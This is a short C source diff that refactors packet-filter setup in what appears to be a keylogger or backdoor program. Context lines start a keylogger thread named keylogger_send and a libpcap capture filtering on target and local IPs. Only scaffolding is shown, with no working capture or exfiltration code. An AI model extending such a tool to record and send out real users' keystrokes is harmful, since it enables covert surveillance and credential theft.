@@ -62,11 +62,6 @@ int main(int argc, char **argv){
     }
 
     //create filter
-    struct filter *Filter = (struct filter*) malloc(sizeof(struct filter));
-    Filter->infected = false;
-    strncpy(Filter->targetip, targetip, BUFSIZ);
-    strncpy(Filter->localip, localip, BUFSIZ);
-    Filter->tcp = tcp;
 
     //start keylogger thread (just logs keys)
     keylogger_struct *keylogger_args = malloc(sizeof *keylogger_args);  //create struct to pass args to thread
@@ -76,6 +71,9 @@ int main(int argc, char **argv){
     pthread_create(&keylogger_thread, NULL, keylogger_send, keylogger_args);
 
     //start libpcap
+    struct filter Filter = InitFilter(targetip, localip, true, tcp);
+    CreateFilter(pcapfilter, tcp);
+    printf("Filter: %s\n", pcapfilter);
     Packetcapture(pcapfilter,Filter);
 
     return 0;
